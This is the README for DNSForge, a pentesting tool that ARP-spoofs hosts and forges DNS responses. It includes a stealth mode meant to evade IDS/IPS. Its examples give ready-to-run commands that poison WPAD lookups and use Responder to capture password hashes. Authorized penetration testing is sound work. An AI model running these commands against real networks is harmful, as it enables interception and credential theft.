# DNSForge
DNSForge is a network pentesting tool that forges DNS responses as if they were originating from the authoritative nameserver. This tool is intended to be used alongside [Responder](https://github.com/lgandx/Responder). The original blog post for DNSForge can be found [here](https://aon.com/cyberlabs/dnsforge)

## Attack Scenario
This tool lends itself in the context of an internal network that consists of Windows workstations and servers. DNSForge utilizes ARP spoofing to redirect DNS requests intended for the authoritative nameserver to the attacker's host. Upon receiving DNS requests, DNSForge poisons the response with the attacker's IP address and, in stealth mode configuration, forges the authoritative nameserver's SOA record. This induces victims to accept DNS responses from a seemingly legitimate source and performs an adversary-in-the-middle attack.

## Installation
The tool can be installed using [pipx](https://github.com/pypa/pipx)
```bash
pipx install git+https://github.com/AonCyberLabs/DNSForge
```

Alternatively, the tool can be installed using [Poetry](https://python-poetry.org/) after cloning the repo.
```bash
poetry install
poetry shell
```

## Usage
```
 ______   ____  _____   ______   ________
|_   _ `.|_   \|_   _|.' ____ \ |_   __  |
  | | `. \ |   \ | |  | (___ \_|  | |_ \_|.--.   _ .--.  .--./) .---.
  | |  | | | |\ \| |   _.____`.   |  _| / .'`\ \[ `/'`\]/ /'`\;/ /__\\
 _| |_.' /_| |_\   |_ | \____) | _| |_  | \__. | | |    \ \._//| \__.,
|______.'|_____|\____| \______.'|_____|  '.__.' [___]   .',__`  '.__.'
                                                       ( ( __))
Author : Apurva Goenka
Version : 0.2.1

usage: dnsforge [-h] -i INTERFACE -p POISON_IP [-ttl TIME_TO_LIVE] [-q QUERY_NAME] [-s] [-v]
                [-ds DNS_SERVER] [-d DOMAIN] (-t TARGET | -tf TARGET_FILE | --no-arp-spoof)

DNS Response Forger

options:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface to sniff/poison on
  -p POISON_IP, --poison-ip POISON_IP
                        IP address to forge/poison DNS response
  -ttl TIME_TO_LIVE, --time-to-live TIME_TO_LIVE
                        TTL (seconds) for poisoned DNS response
  -q QUERY_NAME, --query-name QUERY_NAME
                        DNS Query Name to Poison (can specify multiple by separating with ',')
  -s, --stealth         Stealth Mode
  -v, --verbose         Verbose Output

Stealth Mode:
  -ds DNS_SERVER, --dns-server DNS_SERVER
                        IP address of Authoritative DNS Server
  -d DOMAIN, --domain DOMAIN
                        The domain name of the victim domain

ARP Spoofing:
  -t TARGET, --target TARGET
                        ARP spoofing target IP
  -tf TARGET_FILE, --target-file TARGET_FILE
                        ARP spoofing target IP list
  --no-arp-spoof        Turn off ARP spoofing
```

## Stealth Mode
This option requests the SOA record from the authoritative DNS server and appends it to forged DNS responses for added stealth on networks with IDS/IPS devices. With this mode enabled, the tool produces DNS response messages that exactly match those generated from the authoritative DNS server.

## ARP Spoofing
The tool can be supplied either a target IP with `-t`, a file with target IPs with `-tf` or the `--no-arp-spoof` flag that turns off ARP spoofing and lets the user decide the method of redirecting DNS packets to the attacker's host. At least one of these options must be supplied.

### Spoofing Gateway
In scenarios where the authoritative nameserver does not reside on the same subnet as the attacking host, DNSForge can be configured to perform ARP spoofing against the subnet gateway (either by explicitly supplying the gateway IP as a spoofing target or automatically when a target IP outside the selected interface's subnet is supplied). Since this action can perform denial-of-service against victim clients on the same subnet, DNSForge performs additional checks to verify if IP forwarding is enabled on the attacking host. IP forwarding will ensure that the attacking host acts as the gateway itself and mantains network reliability by forwarding incoming packets to the subnet's gateway IP.

The following command enables IP forwarding on Linux systems: `sudo sysctl -w net.ipv4.ip_forward=1`

Additionally, along with IP forwarding, the following iptables rule is recommended to ensure that only non-DNS traffic is forwarded: `sudo iptables -A FORWARD -i <Interface> -p udp --dport 53 -j DROP`

## Example (Basic)
Sample scenario of poisoning DNS requests for WPAD issued by victim host:
1. Setup DNS Forge to poison incoming requests
```sudo dnsforge -i <Interface> -p <Poison IP> -t <Target ARP Spoof IP> -q wpad```
2. Finally, run Responder to serve malicious WPAD file and capture hashes
```sudo responder -I <Interface> -P```

## Example (Stealth)
Sample scenario of poisoning DNS requests for WPAD issued by victim host in stealth mode:
1. Setup DNS Forge to poison incoming requests after capturing SOA signaure from DNS server.
```sudo dnsforge -i <Interface> -p <Poison IP> -t <Target ARP Spoof IP> -q wpad -s -ds <DNS Server IP> -d <Domain Name>```
2. Finally, run Responder to serve malicious WPAD file and capture hashes
```sudo responder -I <Interface> -P```

### Copyright
Copyright 2024 Aon plc